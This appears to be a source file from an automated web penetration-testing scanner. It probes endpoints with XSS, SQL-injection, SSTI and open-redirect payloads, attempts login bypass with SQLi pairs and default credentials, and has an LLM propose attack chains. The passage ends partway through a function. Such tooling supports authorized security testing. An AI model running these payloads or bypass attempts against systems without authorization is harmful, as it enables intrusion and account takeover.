/**
 * reactAgent.js — Deterministic Breadth-First Exploitation Agent
 *
 * xbow/shannon-inspired methodology:
 *   Phase 1 — Quick triage: 1 probe per endpoint (check reflection/error)
 *   Phase 2 — Targeted attack: 3 payloads max per endpoint showing signal
 *   Phase 3 — Broad scan on un-triaged endpoints
 *   Phase 4 — Auth Bypass: POST SQLi payloads to login/auth forms
 *   Phase 5 — JWT Analysis: Decode JWTs, check for alg:none / weak signing
 *
 * NO LLM dependency in the tight loop — deterministic hypothesis-driven testing.
 */

import { scanEndpoint } from '../../engine/vuln/unifiedEngine.js';
import { globalCoverage } from '../../engine/state/coverageTracker.js';
import { AgentMemory } from './agentMemory.js';
import * as httpRequest from '../../utils/httpRequest.js';
import { IDOR_PROBES, OPEN_REDIRECT_PAYLOADS, WAF_BYPASS_XSS, GRAPHQL_PROBES, getFrameworkPayloads, flattenPayloads, STORED_XSS_INJECTION_PATTERNS, SQLI_PAYLOADS, DEFAULT_CREDENTIALS } from '../../engine/vuln/payloadVault.js';
import { verifyXssInBrowser, verifyStoredXss, verifyFtpExposure, isBrowserVerifierAvailable } from '../../engine/verifiers/browserVerifier.js';
import { runAuthDiscovery } from '../../utils/authDiscovery.js';
import { globalSession } from "../../utils/sessionManager.js";
import crypto from 'crypto';
import { claudeJSON, isClaudeConfigured } from '../../engine/llm/claudeClient.js';
import { captureXssProof, captureIdorProof, captureSqliAuthBypassProof, captureDirectoryListingProof, captureOpenRedirectProof, isPlaywrightAvailable } from '../../engine/vuln/playwrightProver.js';
import { mineParameters } from './paramMiner.js';

const MAX_ENDPOINTS = 200;
const MAX_PAYLOADS_PER_EP = 8;

// Quick probes per vuln type — sent during triage to detect signal
const TRIAGE_PROBES = {
    xss: { payload: '<redvapt_probe>', marker: 'redvapt_probe' },
    sqli: { payload: "'", marker: null },
    ssti: { payload: '{{7*7}}', marker: '49' },
    graphql: { payload: GRAPHQL_PROBES.introspection, marker: '__schema' },
    openredirect: { payload: 'https://attacker.com', marker: null },
    idor: { payload: '1', marker: null }
};

// ── Shannon Patch: Expanded XSS & Auth Payloads ──
const EXPANDED_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    '" onmouseover="alert(1)" x="',
    "' onfocus='alert(1)' autofocus='",
    'javascript:alert(1)',
    '${pageContext.request.servletContext.classLoader}',
    '#{7*7}',
    '</title><script>alert(1)</script>',
    '</textarea><script>alert(1)</script>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    ...WAF_BYPASS_XSS
];

// Focused payloads per vuln type — only used after positive triage
const ATTACK_PAYLOADS = {
    xss: EXPANDED_XSS_PAYLOADS,
    sqli: [
        "'",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
    ],
    ssti: [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
    ],
    graphql: [GRAPHQL_PROBES.sqli, GRAPHQL_PROBES.dos],
    openredirect: OPEN_REDIRECT_PAYLOADS,
    idor: IDOR_PROBES.numericId(2)
};

// Auth Bypass payloads — expanded for TestFire/Java targets
const AUTH_BYPASS_PAYLOADS = [
    { email: "' OR 1=1 --", password: "anything" },
    { email: "' OR '1'='1", password: "anything" },
    { email: "admin'--", password: "anything" },
    { email: "' OR 1=1#", password: "anything" },
    { email: "admin' OR 1=1 --", password: "anything" },
    { email: "admin' AND '1'='1", password: "admin" },
    { email: "admin", password: "admin" },
    { email: "jsmith", password: "demo1234" },
];

// Common auth endpoint path patterns
const AUTH_ENDPOINT_PATTERNS = [
    /\/login/i,
    /\/signin/i,
    /\/auth/i,
    /\/user\/login/i,
    /\/rest\/user\/login/i,
    /\/api\/auth/i,
    /\/api\/login/i,
    /\/dologin/i,
    /\/authenticate/i,
    /\/bank\/login/i,
    /\/admin\/login/i,
    /login\.jsp/i,
    /doLogin/i,
];

/** Resolve a form action relative to the page that hosts the login form. */
function resolveFormActionUrl(loginPageUrl, action) {
    if (!loginPageUrl || !action) return null;
    if (/^https?:\/\//i.test(action)) return action;
    try {
        return new URL(action, loginPageUrl).href;
    } catch {
        return null;
    }
}

/**
 * JSP/ASP login pages often render at login.jsp but POST to a sibling doLogin handler.
 * Probing only the page URL misses real auth (e.g. IBM Altoro / TestFire).
 */
function collectAuthPostTargets(loginPageUrl, reconForms) {
    const ordered = [];
    const seen = new Set();
    const push = (u) => {
        if (!u || seen.has(u)) return;
        seen.add(u);
        ordered.push(u);
    };

    let pathname = '';
    try {
        pathname = new URL(loginPageUrl).pathname;
    } catch {
        return [loginPageUrl].filter(Boolean);
    }

    if (/login\.(jsp|aspx|php)/i.test(pathname)) {
        try {
            push(new URL('doLogin', loginPageUrl).href);
        } catch { /* ignore */ }
    }

    for (const f of reconForms || []) {
        const a = f.action || '';
        if (!/login|signin|auth|doLogin|authenticate|session|dologin/i.test(a)) continue;
        const r = resolveFormActionUrl(loginPageUrl, a);
        if (r) push(r);
        try {
            const origin = new URL(loginPageUrl).origin;
            const r2 = resolveFormActionUrl(`${origin}/`, a);
            if (r2) push(r2);
        } catch { /* ignore */ }
    }

    push(loginPageUrl);
    return ordered;
}

/** Avoid rejecting real successes: generic "failed" matches disclaimers / unrelated copy. */
function authResponseLooksLikeFailure(body) {
    if (!body) return false;
    return /login failed|username or password was not found|not found in our system|invalid credentials|authentication failed|incorrect password|wrong password|invalid password|access denied for user/i.test(
        body
    );
}

function authResponseLooksLikeSuccess(body) {
    if (!body) return false;
    // Avoid matching the public login heading "Online Banking Login" (online + banking).
    return (
        /hello\s+admin|admin\s+user|sign\s*off|sign\s*out|href=[\"']\/logout\.jsp[\"'][^>]*>\s*<[^>]*>\s*sign\s*off/i.test(body) ||
        /my\s+account|\/bank\/main|main\.jsp|account\.jsp|account\s*summary|myaccount|home\.jsp|logged\s*in|bank\s*account|administration|edit\s+users|view\s+account|dashboard|welcome\s+to\s+\w+\s+online/i.test(
            body
        )
    );
}

const JUNK_PATH_RE = /(_vti_bin|_vti_cnf|_vti_pvt|cgi-bin|\.dll$|\.ico$|\.css$|\.woff|\.ttf|\.eot|wp-includes|wp-content\/plugins)/i;

/**
 * Extract the most likely parameter name from a URL or known endpoint patterns.
 * Handles ASPX, PHP, and generic REST endpoints.
 */
function extractBestParamForEndpoint(url) {
    try {
        const params = [...new URL(url).searchParams.entries()];
        if (params.length > 0) return params[0][0];
    } catch { }

    const lower = url.toLowerCase();
    if (lower.includes('search.aspx')) return 'txtSearch';
    if (lower.includes('login.aspx')) return 'uid';
    if (lower.includes('apply.aspx')) return 'lastname';
    if (lower.includes('comment.aspx')) return 'comment';
    if (lower.includes('queryxpath')) return 'username';

    if (/search|query|find/.test(lower)) return 'q';
    if (/user|account|profile/.test(lower)) return 'id';
    if (/file|download|include|content|page|template|view|module|layout/i.test(lower)) return 'file';
    if (/redirect|return|next/.test(lower)) return 'redirect';
    return 'q';
}

// Module-level resolved protocol cache
let _reactResolvedProtocol = null;

// ── E5: Response Fingerprint Dedup ───────────────────────────────────────────
const responseFingerprints = new Set();
function bodyFingerprint(endpoint, body) {
    if (!body || body.length < 50) return null;
    // Normalize: strip dynamic tokens, timestamps, CSRF tokens, session IDs
    let normalized = body
        .replace(/[0-9a-f]{32,64}/gi, 'HASH')
        .replace(/\d{10,13}/g, 'TS')
        .replace(/csrf[^=]*=[^&"']*/gi, 'CSRF')
        .replace(/session[^=]*=[^&"']*/gi, 'SESS')
        .slice(0, 8000);
    try { normalized = new URL(endpoint).pathname + '|' + normalized; } catch {}
    return crypto.createHash('sha256').update(normalized).digest('hex');
}

// ── E1: Baseline Diff Engine ─────────────────────────────────────────────────

/**
 * HTML-encoding-tolerant payload match.
 * A JSP/Java target encodes < > " to &lt; &gt; &quot; before reflecting.
 * A real bug bounty hunter checks all three forms.
 */
function bodyContainsPayload(body, payload) {
    if (!body || !payload) return false;
    // 1. Exact match (PHP/Node targets)
    if (body.includes(payload)) return true;
    // 2. HTML-encoded match (Java/JSP targets like TestFire)
    const encoded = payload
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    if (body.includes(encoded)) return true;
    // 3. Tag-stripped match — catches partial reflections where tags are stripped but text remains
    const stripped = payload.replace(/<[^>]*>/g, '');
    if (stripped.length > 3 && body.toLowerCase().includes(stripped.toLowerCase())) return true;
    return false;
}
async function baselineProbe(endpoint, param, payload, marker) {
    const baseline = await quickProbe(endpoint, param, 'redvapt_safe_val_1');
    const injected = await quickProbe(endpoint, param, payload);
    if (!baseline || !injected) return { confidence: 0, hasSignal: false, signalType: null, baseline, injected };

    const baseLen = (baseline.body || '').length;
    const injLen = (injected.body || '').length;
    const statusDiff = baseline.status !== injected.status;
    const lenDiff = Math.abs(baseLen - injLen);
    const lenRatio = baseLen > 0 ? lenDiff / baseLen : 0;
    const reflected = marker ? (injected.body || '').includes(marker) : false;
    const errorPattern = /SQL|error|exception|syntax|ORA-|mysql|sqlite|JDBC|java\.sql/i.test(injected.body || '');
    const serverError = injected.status >= 500;

    // Compute composite confidence 0.0 – 1.0
    let confidence = 0;
    if (reflected) confidence += 0.4;
    if (statusDiff) confidence += 0.2;
    if (lenRatio > 0.1) confidence += 0.15;
    if (errorPattern) confidence += 0.3;
    if (serverError) confidence += 0.15;
    confidence = Math.min(confidence, 1.0);

    let signalType = null;
    if (reflected) signalType = 'reflection';
    else if (errorPattern) signalType = 'error_pattern';
    else if (statusDiff) signalType = 'status_change';
    else if (lenRatio > 0.15) signalType = 'length_anomaly';

    return {
        hasSignal: confidence >= 0.20,
        signalType,
        confidence,
        statusDiff, lenDiff, lenRatio, reflected, errorPattern,
        baseline, injected
    };
}

/**
 * Lightweight HTTP probe — single request with URL param injection.
 * Normalizes protocol to the resolved working protocol.
 */
async function quickProbe(url, param, payload) {
    try {
        // Normalize protocol if we've resolved it
        let probeBaseUrl = url;
        if (_reactResolvedProtocol && url.startsWith('https://') && _reactResolvedProtocol === 'http') {
            probeBaseUrl = url.replace('https://', 'http://');
        } else if (_reactResolvedProtocol && url.startsWith('http://') && _reactResolvedProtocol === 'https') {
            probeBaseUrl = url.replace('http://', 'https://');
        }

        const urlObj = new URL(probeBaseUrl);
        urlObj.searchParams.set(param, payload);
        const probeUrl = urlObj.toString();
        const cookieHeader = globalSession.getCookieHeader();
        const authHeader = globalSession.getAuthHeader();
        const headers = {
            ...(cookieHeader ? { Cookie: cookieHeader } : {}),
            ...(authHeader ? { Authorization: authHeader } : {})
        };
        const result = await httpRequest.executeFast({ url: probeUrl, method: 'GET', headers });
        return result || null;
    } catch {
        return null;
    }
}

/**
 * Form-based POST probe — handles both JSON APIs and traditional form POST.
 */
async function authProbe(url, data, contentType = 'json') {
    try {
        const cookieHeader = globalSession.getCookieHeader();

        let body, headers;
        if (contentType === 'json') {
            body = JSON.stringify(data);
            headers = { 'Content-Type': 'application/json' };
        } else {
            body = new URLSearchParams(data).toString();
            headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
        }

        if (cookieHeader) headers['Cookie'] = cookieHeader;
        const authHeader = globalSession.getAuthHeader();
        if (authHeader) headers['Authorization'] = authHeader;

        const result = await httpRequest.execute({
            url, method: 'POST', data: body, headers,
        });
        return result || null;
    } catch {
        return null;
    }
}

// ── Shannon Patch: Full Form Probe ──
/**
 * @param {Record<string, string>|null} fixedValues When set, these field names override placeholders (used for SQLi auth pairs and default-credential tests).
 */
async function fullFormProbe(actionUrl, method, inputs, targetField, payload, globalSess = globalSession, fixedValues = null) {
    const formData = {};
    for (const input of (inputs || [])) {
        const name = typeof input === "string" ? input : input.name;
        if (!name) continue;

        if (fixedValues && Object.prototype.hasOwnProperty.call(fixedValues, name)) {
            formData[name] = fixedValues[name];
            continue;
        }

        if (name === targetField) {
            formData[name] = payload;
        } else if (/pass/i.test(name)) {
            formData[name] = "ValidPass123!";
        } else if (/email/i.test(name)) {
            formData[name] = "test@test.com";
        } else if (/csrf|token|_token/i.test(name)) {
            const token = globalSess?.getToken?.(name) || "";
            formData[name] = token;
        } else {
            formData[name] = "test";
        }
    }

    const body = new URLSearchParams(formData).toString();
    const cookieHeader = globalSess?.getCookieHeader?.() || "";
    const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        ...(cookieHeader ? { Cookie: cookieHeader } : {}),
    };

    try {
        if (method?.toUpperCase() === "POST") {
            return await httpRequest.execute({ url: actionUrl, method: "POST", data: body, headers });
        } else {
            const sep = actionUrl.includes("?") ? "&" : "?";
            const getUrl = `${actionUrl}${sep}${body}`;
            return await httpRequest.execute({ url: getUrl, method: "GET", headers });
        }
    } catch {
        return null;
    }
}

/**
 * Shannon Patch: Extended analyze response catching HTML-encoded XSS and Java errors
 */
function analyzeResponseExtended(response, probe, vulnType) {
    if (!response || !response.body) return { hasSignal: false, signalType: null };

    const body = response.body || "";
    const status = response.status || 200;

    // WAF / block detection
    if (status === 403 || status === 406 ||
        /cloudflare|mod_security|access denied|request blocked/i.test(body)) {
        return { hasSignal: false, signalType: "waf_block" };
    }

    if (vulnType === "xss") {
        if (probe.marker && body.includes(probe.marker)) {
            return { hasSignal: true, signalType: "xss_reflection" };
        }
        const htmlEncoded = (probe.marker || "")
            .replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
        if (htmlEncoded && body.includes(htmlEncoded)) {
            return { hasSignal: true, signalType: "xss_encoded_reflection" };
        }
        const stripped = (probe.marker || "").replace(/<[^>]*>/g, "");
        if (stripped.length > 3 && body.toLowerCase().includes(stripped.toLowerCase())) {
            return { hasSignal: true, signalType: "xss_partial_reflection" };
        }
    }

    if (vulnType === "sqli") {
        const sqlErrors = [
            /SQL syntax.*MySQL/i, /ORA-\d{5}/i, /PostgreSQL.*ERROR/i,
            /you have an error in your sql syntax/i, /Unclosed quotation mark/i,
            /SQLSTATE\[/i, /sqlite3?\./i,
            /java\.sql\.SQL/i, /javax\.servlet\.ServletException/i,
            /java\.lang\.\w*Exception/i, /org\.apache\./i,
            /JDBC.*Exception/i, /at\s+com\.\w+\.\w+\.\w+\(/i,
            /Error processing request/i, /Internal Server Error/i,
        ];
        if (sqlErrors.some(p => p.test(body))) {
            return { hasSignal: true, signalType: "sqli_error" };
        }
        if (status === 500) {
            return { hasSignal: true, signalType: "sqli_error_500" };
        }
    }

    if (vulnType === "ssti" && probe.marker && body.includes(probe.marker)) {
        return { hasSignal: true, signalType: "ssti_eval" };
    }

    if (vulnType === "ssti" && body.includes("49")) {
        return { hasSignal: true, signalType: "ssti_el_eval" };
    }

    return { hasSignal: false, signalType: null };
}

/**
 * Decode a JWT token (base64url decode, no verification).
 */
function decodeJwt(token) {
    try {
        const parts = token.split('.');
        if (parts.length !== 3) return null;
        const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
        return { header, payload, signature: parts[2] };
    } catch {
        return null;
    }
}

/**
 * Analyze JWT for common weaknesses (CWE-315, CWE-346).
 */
function analyzeJwtWeakness(decoded) {
    const issues = [];
    if (!decoded) return issues;

    const { header, payload } = decoded;

    // alg:none attack
    if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
        issues.push({ type: 'jwt_alg_none', severity: 'critical', detail: 'JWT uses alg:none — signature bypass possible' });
    }

    // Weak algorithms
    if (['HS256', 'HS384'].includes(header.alg)) {
        issues.push({ type: 'jwt_weak_alg', severity: 'medium', detail: `JWT uses ${header.alg} — susceptible to brute force` });
    }

    // Sensitive data in payload
    const sensitiveKeys = ['password', 'secret', 'credit_card', 'ssn'];
    for (const key of sensitiveKeys) {
        if (payload[key]) {
            issues.push({ type: 'jwt_sensitive_data', severity: 'high', detail: `JWT payload contains sensitive field: ${key}` });
        }
    }

    // Email/role exposure (informational but useful for escalation)
    if (payload.email && payload.role) {
        issues.push({ type: 'jwt_info_exposure', severity: 'low', detail: `JWT exposes email (${payload.email}) and role (${payload.role})` });
    }

    // Missing expiration
    if (!payload.exp) {
        issues.push({ type: 'jwt_no_expiry', severity: 'medium', detail: 'JWT has no expiration (exp) claim — token never expires' });
    }

    return issues;
}

function createToolRegistry() {
    return { hasTool: () => false, executeTool: () => null };
}

export async function runReactLoop(target, options = {}, onProgress = () => { }) {
    const { hypothesisQueue = [], maxIterations = 120, reconData, attackPlan } = options;
    const memory = new AgentMemory();

    const vulns = [];
    const confirmedVulnTypes = new Map(); // Tracks which specific vuln types are confirmed per endpoint.
    let signalEndpoints = [];

    const normalizeEndpoint = (url) => {
        if (!url) return '';
        try {
            const u = new URL(url);
            let path = u.pathname;
            // Remove noise: trailing numbers (aspx5), script tags (%3Cscript%3E), fuzzed chars (';")
            path = path.replace(/\d+$/, ''); 
            path = path.replace(/%3C.*$/i, '');
            path = path.replace(/['";].*$/, '');
            if (path.endsWith('/')) path = path.slice(0, -1);
            return `${u.origin}${path}`;
        } catch { return url; }
    };

    // Check: only skip if THIS EXACT vulnType is already confirmed here
    const isVulnTypeConfirmed = (endpoint, vulnType) => {
        const norm = normalizeEndpoint(endpoint);
        return confirmedVulnTypes.has(norm) && confirmedVulnTypes.get(norm).has((vulnType || 'unknown').toLowerCase());
    };

    // Mark: record this specific vulnType as done for this endpoint
    const markVulnTypeConfirmed = (endpoint, vulnType) => {
        const norm = normalizeEndpoint(endpoint);
        if (!confirmedVulnTypes.has(norm)) confirmedVulnTypes.set(norm, new Set());
        confirmedVulnTypes.get(norm).add((vulnType || 'unknown').toLowerCase());
    };

    const pushVuln = (v) => {
        const norm = normalizeEndpoint(v.endpoint || v.url);
        
        // Ensure consistent ID generation if missing (prevents report inconsistencies)
        if (!v.id) {
            const timestamp = Math.floor(Date.now() / 1000).toString(16);
            const rand = Math.floor(Math.random() * 0xFFFF).toString(16).padStart(4, '0');
            v.id = `RVPT-${new Date().getFullYear()}-${timestamp.slice(-4)}${rand}`.toUpperCase();
        }

        // Mark this specific vuln type as confirmed — not the whole endpoint
        if (v.severity === 'Critical' || v.severity === 'High' || v.severity === 'Medium') { 
            markVulnTypeConfirmed(v.endpoint || v.url, v.type); 
        }

        // Improved deduplication logic (case-insensitive + robust parameter matching)
        const isDup = vulns.some(existing => 
            normalizeEndpoint(existing.endpoint || existing.url) === norm && 
            existing.type.toLowerCase() === v.type.toLowerCase() && 
            (existing.param === v.param || (!existing.param && !v.param))
        );
        if (!isDup) {
            vulns.push(v);
            
            // Mid-scan chain synthesis
            const distinctTypes = new Set(vulns.map(vx => vx.type));
            if (distinctTypes.size >= 2 && vulns.length % 2 === 0 && isClaudeConfigured()) {
                (async () => {
                    onProgress({ phase: 'react', status: 'running', message: `🧠 Synthesizing attack chains from ${vulns.length} findings...` });
                    try {
                        const chainPrompt = `Given these confirmed vulnerabilities:\n${JSON.stringify(vulns.map(vx => ({ endpoint: vx.endpoint || vx.url, type: vx.type, param: vx.param })))}\nWhat's the highest-impact combined attack chain we should probe next? Return JSON: { "pivot_endpoint": "url", "target_param": "param", "vulnType": "type to test", "reason": "why this chain works" }`;
                        const chainRes = await claudeJSON(chainPrompt, { maxTokens: 500 });
                        if (chainRes?.pivot_endpoint && chainRes?.vulnType) {
                            onProgress({ phase: 'react', status: 'running', message: `⛓️ Chain strategy: ${chainRes.reason}` });
                            signalEndpoints.unshift({
                                endpoint: chainRes.pivot_endpoint,
                                param: chainRes.target_param || '',
                                vulnType: chainRes.vulnType,
                                signalType: 'chain_synthesis',
                                confidence: 0.95
                            });
                        }
                    } catch (e) {
                        console.warn('[ReactAgent] Chain synthesis failed:', e.message);
                    }
                })();
            }

            return true;
        }
        return false;
    };
    const chains = [];
    const attemptedFindings = [];
    let totalSteps = 0;

    // Phase 9 FIX: Resolve working protocol ONCE at start of ReAct loop
    try {
        if (target.startsWith('https')) {
            _reactResolvedProtocol = 'https';
        } else if (target.startsWith('http')) {
            _reactResolvedProtocol = 'http';
        } else {
            const targetHost = target.split('/')[0];
            // Try HTTPS first for security, fallback to HTTP for legacy
            for (const proto of ['https', 'http']) {
                try {
                    const testResult = await httpRequest.execute({ url: `${proto}://${targetHost}/`, method: 'HEAD' });
                    if (testResult && testResult.status && testResult.status < 500) {
                        _reactResolvedProtocol = proto;
                        break;
                    }
                } catch { }
            }
        }
        onProgress({ phase: 'react', status: 'running', message: `Resolved working protocol: ${_reactResolvedProtocol}` });
    } catch { }
    if (!_reactResolvedProtocol) _reactResolvedProtocol = 'http'; // Default HTTP for legacy

    // ── Pre-Scan Authentication Discovery ─────────────────────────────────────
    let authSession = null;
    try {
        const proto = _reactResolvedProtocol || 'http';
        const host = target.replace(/^https?:\/\//, '').split('/')[0];
        const baseUrl = `${proto}://${host}`;
        
        authSession = await runAuthDiscovery(baseUrl, reconData, onProgress);
        
        if (authSession?.authenticated) {
            console.log(`[ReactAgent] Auth session established (${authSession.userType})`);
            globalSession.setCookieString(authSession.cookie);
            globalSession.setBearerToken(authSession.bearer);
            
            onProgress({ 
                phase: 'react', 
                status: 'running', 
                message: `✅ Auth established: Testing as ${authSession.userType} access` 
            });
        } else {
            console.log('[ReactAgent] No auth session established, scanning anonymously');
        }
    } catch (err) {
        console.warn(`[ReactAgent] Auth discovery failed: ${err.message}`);
    }

    // ── PHASE 0.2: Secret Validation ────────────────────────────────────────────
    if (reconData?.jsSecrets?.length > 0) {
        onProgress({ phase: 'react', status: 'running', message: `🔐 Phase 0: Verifying ${reconData.jsSecrets.length} discovered JS secrets...` });
        for (const secret of reconData.jsSecrets.slice(0, 20)) {
            const val = typeof secret === 'string' ? secret : secret.value;
            if (!val) continue;

            let svc = null;
            if (/AKIA[0-9A-Z]{16}/.test(val)) svc = 'AWS Access Key';
            else if (/xox[baprs]-[0-9A-Za-z]{10,48}/.test(val)) svc = 'Slack Token';
            else if (/sk_live_[0-9a-zA-Z]{24}/.test(val)) svc = 'Stripe API Key';

            if (svc) {
                const src = typeof secret === 'object' ? (secret.source || secret.js_file || '') : '';
                const finding = {
                    type: 'Exposed Credentials',
                    severity: 'Critical',
                    endpoint: src && /^https?:\/\//i.test(src) ? src : `https://placeholder.invalid/js-asset`,
                    method: 'GET',
                    message: `Active ${svc} detected in frontend assets: ${val}`,
                    verified: true,
                    curlPoC: src && /^https?:\/\//i.test(src) ? `curl -sS -k '${src}' | grep -Eo '${String(val).slice(0, 12)}[^\\s\"']*' || true` : '# PoC: open the same JS URL from recon in a browser and search for the pattern in Sources.',
                    evidence: {
                        request: src ? `GET ${src}` : 'Static JS analysis',
                        response_snippet: `Pattern confirmed in client bundle (${svc}). Redacted sample: ${String(val).slice(0, 6)}…${String(val).slice(-4)}`,
                        tool_used: 'RedVapt-SecretScanner',
                        tool_evidence: 'High-entropy secret matched vendor format',
                    },
                };
                if (pushVuln(finding)) {
                    memory.addConfirmedVuln(finding);
                    globalCoverage.addConfirmedFinding(finding);
                    onProgress({
                        phase: 'react', status: 'finding',
                        message: `🚨 CRITICAL: Live ${svc} detected!`,
                        vulnerability: finding,
                    });
                }
            }
        }
    }

    // ── PHASE 1: Fingerprint ──────────────────────────────────────────────
    onProgress({ phase: 'react', status: 'running', message: `🧠 Phase 1: Fingerprinting Tech Stack...` });
    const techStack = {
        os: 'Unknown',
        framework: 'unknown',
        waf: false,
        servers: [],
        swagger: reconData?.swagger || null,
    };
    if (reconData?.headers) {
        const serv = (reconData.headers['server'] || '').toLowerCase();
        const powered = (reconData.headers['x-powered-by'] || '').toLowerCase();
        if (serv.includes('windows') || serv.includes('iis')) {
            techStack.os = 'Windows';
            techStack.framework = 'aspnet';
        } else if (serv.includes('ubuntu') || serv.includes('debian')) techStack.os = 'Linux';
        if (serv.includes('apache')) techStack.servers.push('Apache');
        if (serv.includes('nginx')) techStack.servers.push('Nginx');
        if (powered.includes('asp.net') || powered.includes('aspnet')) techStack.framework = 'aspnet';

        if (reconData.headers['cf-ray']) techStack.waf = true;
    }
    const endpointSample = [...(reconData?.endpoints || [])].slice(0, 40).join(' ').toLowerCase();
    if (/\.aspx|viewstate|__viewstate|asp\.net/i.test(endpointSample)) {
        techStack.framework = 'aspnet';
    }

    // ── PHASE 2: Build Full Endpoint Map (Bug Bounty Style) ──────────────
    // A real bug bounty hunter maps EVERYTHING: crawled URLs, forms, JS files, GAU params
    onProgress({ phase: 'react', status: 'running', message: `🗺️ Phase 2: Building comprehensive attack surface from recon data...` });
    const endpointMap = new Map();

    // Source 1: Hypothesis queue (from orchestrator fallback)
    for (const h of hypothesisQueue) {
        if (!h.endpoint) continue;
        if (!endpointMap.has(h.endpoint)) endpointMap.set(h.endpoint, []);
        endpointMap.get(h.endpoint).push({ paramName: h.paramName || 'q', vulnType: h.type });
    }

    // Source 1.5: AI Attack Plan (Phase 11 Fix)
    if (attackPlan && attackPlan.topTargets) {
        for (const t of attackPlan.topTargets) {
            if (!t.url) continue;
            // Ensure absolute URL
            let fullUrl = t.url;
            if (!fullUrl.startsWith('http')) {
                const proto = _reactResolvedProtocol || 'http';
                const host = target.replace(/^https?:\/\//, '').split('/')[0];
                fullUrl = `${proto}://${host}${fullUrl.startsWith('/') ? '' : '/'}${fullUrl}`;
            }
            if (!endpointMap.has(fullUrl)) endpointMap.set(fullUrl, []);
            for (const vec of t.attackVectors || ['SQLI', 'XSS']) {
                endpointMap.get(fullUrl).push({
                    paramName: extractBestParamForEndpoint(fullUrl),
                    vulnType: vec.toLowerCase().replace('_', ''),
                    method: t.method || 'GET'
                });
            }
        }
    }

    // Source 2: ALL crawled endpoints (this is where login.jsp, feedback.jsp, search.jsp come from)
    const reconEndpoints = [
        ...(reconData?.endpoints || []),
        ...(reconData?.crawledUrls || []),
        ...(reconData?.parameters || []),
        ...(reconData?.jsEndpoints || []).map(e => typeof e === 'string' ? e : e.url || '').filter(Boolean),
    ].map(e => typeof e === 'string' ? e : e.url || '').filter(Boolean);

    for (const ep of reconEndpoints) {
        // [SHANNON PATCH]: Pre-baked payload detection from GAU/Wayback
        try {
            const u = new URL(ep);
            for (const [key, val] of u.searchParams.entries()) {
                const dec = decodeURIComponent(val);
                if (/<script|alert\(|onerror=|onload=|eval\(/i.test(dec) || /%3Cscript|%3Ealert/i.test(val)) {
                    if (!endpointMap.has(ep)) endpointMap.set(ep, []);
                    endpointMap.get(ep).push({
                        paramName: key,
                        vulnType: 'xss',
                        prebakedPayload: val
                    });
                }
            }
        } catch {}

        if (endpointMap.has(ep)) continue;
        const param = extractBestParamForEndpoint(ep);
        const vulnType = /login|auth|signin/i.test(ep) ? 'sqli' :
            /search|query|find/i.test(ep) ? 'xss' :
                /feedback|comment|contact|subscribe/i.test(ep) ? 'xss' :
                    /file|download|include|load|content|page|template|view|module|layout/i.test(ep) ? 'lfi' : 'xss';
        endpointMap.set(ep, [{ paramName: param, vulnType }]);
    }

    // Source 3: ALL crawled forms — these are GOLD for bug bounty (login forms, feedback, search)
    const reconForms = reconData?.forms || [];
    for (const form of reconForms) {
        const action = form.action || form.url;
        if (!action) continue;
        // Resolve relative URLs
        let fullUrl = action;
        if (!action.startsWith('http')) {
            const proto = _reactResolvedProtocol || 'http';
            const host = target.replace(/^https?:\/\//, '').split('/')[0];
            fullUrl = `${proto}://${host}${action.startsWith('/') ? '' : '/'}${action}`;
        }
        if (!endpointMap.has(fullUrl)) endpointMap.set(fullUrl, []);
        const inputs = (form.inputs || []).map(i => typeof i === 'string' ? i : i.name).filter(Boolean);
        for (const inp of inputs) {
            endpointMap.get(fullUrl).push({
                paramName: inp,
                vulnType: /password|passw|pwd/i.test(inp) ? 'sqli' :
                    /search|query|q/i.test(inp) ? 'xss' :
                        /comment|message|feedback|text/i.test(inp) ? 'xss' : 'sqli',
                method: (form.method || 'POST').toUpperCase(),
                formData: true,
            });
        }
    }

    // Broaden hypotheses: high-value URLs get multiple vuln-class probes (SQLi/SSTI/LFI/GraphQL — not XSS-only)
    for (const ep of [...endpointMap.keys()]) {
        const hy = endpointMap.get(ep);
        if (!hy?.length) continue;
        const has = (t) => hy.some((h) => (h.vulnType || '').toLowerCase() === t.toLowerCase());
        const low = ep.toLowerCase();
        const firstParam = hy[0].paramName || extractBestParamForEndpoint(ep);
        if ((/login|signin|dologin|authenticate/.test(low)) && !has('sqli')) {
            hy.push({ paramName: firstParam, vulnType: 'sqli', method: 'POST' });
        }
        if ((/search|query|content=/.test(low) || /\?.+=/.test(ep)) && !has('sqli')) {
            hy.push({ paramName: firstParam, vulnType: 'sqli' });
        }
        if ((/search|query|template|title|name=/.test(low)) && !has('ssti')) {
            hy.push({ paramName: firstParam, vulnType: 'ssti' });
        }
        if ((/file|path|include|download|content|page=/.test(low)) && !has('lfi')) {
            hy.push({ paramName: firstParam, vulnType: 'lfi' });
        }
        if ((/\/graphql|graphql\?/i.test(low)) && !has('graphql')) {
            hy.push({ paramName: 'query', vulnType: 'graphql', method: 'POST' });
        }
        if ((/\/api\/|\/rest\/|\/v\d+\//i.test(low)) && /[?&](id|uid|userId|accountId)=/i.test(ep) && !has('idor')) {
            hy.push({ paramName: firstParam, vulnType: 'idor' });
        }
    }

    // Auto-discover contextual params
    for (const [ep, _] of endpointMap) {
        try {
            const mined = await mineParameters(ep, 'GET', techStack);
            mined.forEach(p => endpointMap.get(ep).push({ paramName: p.name, vulnType: p.lfi_priority ? 'lfi' : 'sqli' }));
        } catch { }
    }

    // ── SPA Detection: Seed known endpoints when crawler finds < 5 (Issue #4) ──
    // Angular/React SPAs return only a shell (<app-root>) — static crawlers get nothing.
    // Detect low endpoint count and seed well-known REST API paths so they are tested.
    if (endpointMap.size < 5) {
        const proto = _reactResolvedProtocol || 'http';
        const host = target.replace(/^https?:\/\//, '').split('/')[0];
